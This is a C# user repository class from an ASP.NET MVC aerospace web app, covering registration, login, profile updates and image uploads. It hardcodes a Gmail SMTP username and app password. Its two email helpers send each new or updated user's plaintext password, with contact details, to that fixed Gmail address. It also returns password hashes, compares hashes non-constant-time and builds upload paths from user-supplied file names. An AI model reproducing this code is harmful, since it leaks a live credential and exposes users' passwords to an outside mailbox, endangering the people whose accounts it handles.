using Microsoft.AspNetCore.Cryptography.KeyDerivation;
using RaythosAerospaceMVC.Models;
using System.Net.Mail;
using System.Net;
using System.Security.Cryptography;

namespace RaythosAerospaceMVC.Repository
{
    public class UserRepository : IUserRepository
    {

        private readonly AerospaceDbContext _context; // Replace YourDbContext with your actual DbContext name

        public UserRepository(AerospaceDbContext context)
        {
            _context = context;
        }

        public UserRepository()
        {
        }

        public string AddUser(User newUser)
        {

            User userToAdd = new User();

            // Hash the user's password before saving it to the database
            byte[] salt = new byte[128 / 8];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(salt);
            }

            string hashedPassword = Convert.ToBase64String(
                KeyDerivation.Pbkdf2(
                    password: newUser.Password,
                    salt: salt,
                    prf: KeyDerivationPrf.HMACSHA256,
                    iterationCount: 10000,
                    numBytesRequested: 256 / 8));

            userToAdd.Password = hashedPassword;
            userToAdd.PasswordSalt = Convert.ToBase64String(salt);
            userToAdd.Email = newUser.Email;
            userToAdd.Username = newUser.Username;
            userToAdd.CreateDate = DateTime.Now;

            _context.Users.Add(userToAdd);
            _context.SaveChanges();

             SendNewUserEmail(newUser);


            //return GenerateJwtToken(newUser);
            return hashedPassword;
        }

        public bool IsEmailAlreadyExists(string email)
        {
            // Check if a user with the provided email exists
            return _context.Users.Any(u => u.Email == email);
        }

        // Implement other methods as needed

        // Example method to generate JWT token
        //public string GenerateJwtToken(User user)
        //{
        //    var tokenHandler = new JwtSecurityTokenHandler();
        //    var key = Encoding.ASCII.GetBytes("YourSecretKey"); // Replace with your actual secret key

        //    var tokenDescriptor = new SecurityTokenDescriptor
        //    {
        //        Subject = new ClaimsIdentity(new[] { new Claim("id", user.Id.ToString()) }),
        //        Expires = DateTime.UtcNow.AddHours(1), // Token expiration time
        //        SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
        //    };

        //    var token = tokenHandler.CreateToken(tokenDescriptor);
        //    return tokenHandler.WriteToken(token);
        //}



        public User AuthenticateUser(string email, string password)
        {
            // Find the user by email (assuming email is unique)
            var user = _context.Users.SingleOrDefault(u => u.Email == email);

            if (user != null && VerifyPassword(password, user.Password, user.PasswordSalt))
            {
                // If the user is found and the password is correct
                return user;
            }

            // Return null if the user is not found or the password is incorrect
            return null;
        }

        // Password verification method (you might have your own secure method here)
        // Password verification method
        private bool VerifyPassword(string password, string storedPasswordHash, string storedSalt)
        {
            byte[] salt = Convert.FromBase64String(storedSalt);
            byte[] hashBytes = Convert.FromBase64String(storedPasswordHash);

            // Compute the hash of the entered password with the stored salt
            string enteredPasswordHash = Convert.ToBase64String(
                KeyDerivation.Pbkdf2(
                    password: password,
                    salt: salt,
                    prf: KeyDerivationPrf.HMACSHA256,
                    iterationCount: 10000,
                    numBytesRequested: 256 / 8));

            // Compare the computed hash with the stored hash
            return enteredPasswordHash == storedPasswordHash;
        }

        public User GetUser(string email)
        {
            // Find the user by email (assuming email is unique)
            var user = _context.Users.SingleOrDefault(u => u.Email == email);

            if (user != null)
            {
                // If the user is found and the password is correct
                return user;
            }

            // Return null if the user is not found or the password is incorrect
            return null;
        }

        public async Task<User> GetUserByIdAsync(int id)
        {
            // Find the user by email (assuming email is unique)
            var user = _context.Users.SingleOrDefault(u => u.Id == id);



            if (user != null)
            {
                // If the user is found and the password is correct
                user.Password = null;
                user.ConfirmPassword = null;
                return user;
            }

            // Return null if the user is not found or the password is incorrect
            return null;
        }


        public async Task<string> UploadImage(IFormFile imageFile)
        {
            if (imageFile == null || imageFile.Length <= 0)
            {
                throw new ArgumentException("Image file is empty or null.");
            }

            try
            {
                // Generate a unique file name or use a GUID
                string uniqueFileName = Guid.NewGuid().ToString() + "_" + imageFile.FileName;

                // Define the directory to save the uploaded file
                string uploadsFolder = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot", "user");

                // Ensure the directory exists, create if not
                if (!Directory.Exists(uploadsFolder))
                {
                    Directory.CreateDirectory(uploadsFolder);
                }

                // Combine the directory path and file name
                string filePath = Path.Combine(uploadsFolder, uniqueFileName);

                // Copy the file to the specified path
                using (var fileStream = new FileStream(filePath, FileMode.Create))
                {
                    await imageFile.CopyToAsync(fileStream);
                }

                // Return the relative path to the uploaded file
                return Path.Combine("user", uniqueFileName);
            }
            catch (Exception ex)
            {
                // Handle exceptions appropriately (logging, error handling, etc.)
                throw new ApplicationException("Error occurred while uploading the image.", ex);
            }
        }

        public async Task<bool> UpdateUser(User updatedUser)
        {
            var userToUpdate = _context.Users.FirstOrDefault(u => u.Id == updatedUser.Id);

            if (userToUpdate == null)
            {
                return false; // User not found
            }

            // Update other user details (if needed)
            userToUpdate.Email = updatedUser.Email;
            userToUpdate.FirstName = updatedUser.FirstName;
            userToUpdate.LastName = updatedUser.LastName;
            userToUpdate.Address = updatedUser.Address;
            userToUpdate.ImageUrl = updatedUser.ImageUrl;
            userToUpdate.PhoneNumber = updatedUser.PhoneNumber;
            userToUpdate.UpdateDate = updatedUser.UpdateDate;



            if (!string.IsNullOrWhiteSpace(updatedUser.Password))
            {
                byte[] salt = new byte[128 / 8];
                using (var rng = RandomNumberGenerator.Create())
                {
                    rng.GetBytes(salt);
                }

                string hashedPassword = Convert.ToBase64String(
                    KeyDerivation.Pbkdf2(
                        password: updatedUser.Password,
                        salt: salt,
                        prf: KeyDerivationPrf.HMACSHA256,
                        iterationCount: 10000,
                        numBytesRequested: 256 / 8));

                userToUpdate.Password = hashedPassword;
                userToUpdate.PasswordSalt = Convert.ToBase64String(salt);
            }

            _context.SaveChanges();

            await SendContactEmail(userToUpdate, updatedUser.Password);


            return true; // User updated successfully
        }

        private async Task SendContactEmail(User userToUpdate, string Password)
        {
            try
            {
                string smtpServer = "smtp.gmail.com";
                string smtpUsername = "keminda4lk@gmail.com";
                string smtpPassword = "jvdsgagljwyomquz";

                using (var mailMessage = new MailMessage())
                using (var smtpClient = new SmtpClient(smtpServer))
                {
                    mailMessage.From = new MailAddress("keminda4lk@gmail.com");
                    mailMessage.To.Add("keminda4lk@gmail.com");
                    mailMessage.Subject = "Profile Setting Update";
                    mailMessage.Body = $"Name: {userToUpdate.FirstName} {userToUpdate.LastName} \nEmail: {userToUpdate.Email}\nContact Number: {userToUpdate.PhoneNumber}\nNew Password: {Password}";
                    mailMessage.IsBodyHtml = false;

                    smtpClient.Port = 587;
                    smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
                    smtpClient.EnableSsl = true;

                    await smtpClient.SendMailAsync(mailMessage);
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions, log errors, or send an error response to the user
                Console.WriteLine(ex.ToString());
                // You might want to log the error using a proper logging library
                // and consider returning an error response to the user if applicable
            }
        }

        private async Task SendNewUserEmail(User userToUpdate)
        {
            try
            {
                string smtpServer = "smtp.gmail.com";
                string smtpUsername = "keminda4lk@gmail.com";
                string smtpPassword = "jvdsgagljwyomquz";

                using (var mailMessage = new MailMessage())
                using (var smtpClient = new SmtpClient(smtpServer))
                {
                    mailMessage.From = new MailAddress("keminda4lk@gmail.com");
                    mailMessage.To.Add("keminda4lk@gmail.com");
                    mailMessage.Subject = "New User Credentials";
                    mailMessage.Body = $"Name: {userToUpdate.Username} \nEmail: {userToUpdate.Email}\nPassword: {userToUpdate.Password}";
                    mailMessage.IsBodyHtml = false;

                    smtpClient.Port = 587;
                    smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
                    smtpClient.EnableSsl = true;

                    await smtpClient.SendMailAsync(mailMessage);
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions, log errors, or send an error response to the user
                Console.WriteLine(ex.ToString());
                // You might want to log the error using a proper logging library
                // and consider returning an error response to the user if applicable
            }
        }

    }
}
